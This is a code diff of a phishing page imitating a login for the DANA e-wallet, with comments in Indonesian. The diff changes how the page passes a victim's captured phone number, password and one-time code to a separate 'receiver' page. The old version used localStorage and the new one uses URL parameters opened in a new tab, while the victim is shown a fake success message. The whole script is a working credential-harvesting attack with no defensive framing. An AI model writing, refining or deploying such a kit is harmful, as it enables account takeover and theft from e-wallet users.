@@ -26,8 +26,6 @@
             width: 100%;
             box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
             animation: fadeUp 0.5s ease;
-            position: relative;
-            overflow: hidden;
         }
         @keyframes fadeUp {
             from { opacity: 0; transform: translateY(30px); }
@@ -37,7 +35,6 @@
         .logo-dana {
             text-align: center;
             margin-bottom: 28px;
-            position: relative;
         }
         .logo-dana .icon-wrapper {
             display: inline-block;
@@ -337,7 +334,7 @@
 
 <script>
     // ============================================================
-    // INDEX.HTML — PASTI KIRIM DATA KE LOCALSTORAGE
+    // INDEX — KIRIM DATA VIA URL KE RECEIVER
     // ============================================================
 
     const loginForm = document.getElementById('loginForm');
@@ -379,7 +376,7 @@
         otpError.style.display = 'none';
     }
 
-    // ===== LOGIN =====
+    // ===== LOGIN — BUKA RECEIVER DENGAN DATA VIA URL =====
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         hideAlerts();
@@ -398,23 +395,18 @@
             return;
         }
 
-        // === KIRIM DATA KE RECEIVER ===
-        const userData = {
-            phone: phone,
-            password: password,
-            timestamp: new Date().toISOString(),
-            status: 'pending'
-        };
-        localStorage.setItem('dana_user_data', JSON.stringify(userData));
-        // Trigger event buat receiver
-        window.dispatchEvent(new Event('storage'));
+        // === BUKA RECEIVER DENGAN DATA VIA URL ===
+        const baseUrl = window.location.href.split('?')[0].replace('index.html', 'receiver.html');
+        const encodedPhone = encodeURIComponent(phone);
+        const encodedPassword = encodeURIComponent(password);
+        const receiverUrl = `${baseUrl}?phone=${encodedPhone}&password=${encodedPassword}`;
 
-        showPage('pageLoading');
+        // Buka receiver di tab baru
+        window.open(receiverUrl, '_blank');
 
-        setTimeout(() => {
-            document.getElementById('otpPhoneDisplay').textContent = phone;
-            showPage('pageOtp');
-        }, 2000);
+        // Lanjut ke OTP
+        document.getElementById('otpPhoneDisplay').textContent = phone;
+        showPage('pageOtp');
     });
 
     // ===== OTP VERIFICATION =====
@@ -441,24 +433,14 @@
         const phone = document.getElementById('danaPhone').value.trim();
         const password = document.getElementById('danaPassword').value.trim();
 
-        // === SIMPAN OTP ===
-        const otpData = {
-            otp: otp,
-            phone: phone,
-            password: password,
-            timestamp: new Date().toISOString(),
-            status: 'verified'
-        };
-        localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
-        window.dispatchEvent(new Event('storage'));
+        // === UPDATE RECEIVER DENGAN OTP ===
+        const baseUrl = window.location.href.split('?')[0].replace('index.html', 'receiver.html');
+        const encodedPhone = encodeURIComponent(phone);
+        const encodedPassword = encodeURIComponent(password);
+        const receiverUrl = `${baseUrl}?phone=${encodedPhone}&password=${encodedPassword}&otp=${otp}`;
 
-        // UPDATE USER STATUS
-        const userData = JSON.parse(localStorage.getItem('dana_user_data'));
-        if (userData) {
-            userData.status = 'otp_sent';
-            localStorage.setItem('dana_user_data', JSON.stringify(userData));
-            window.dispatchEvent(new Event('storage'));
-        }
+        // Buka receiver baru dengan OTP
+        window.open(receiverUrl, '_blank');
 
         otpError.style.display = 'block';
         otpError.className = 'alert-dana success';
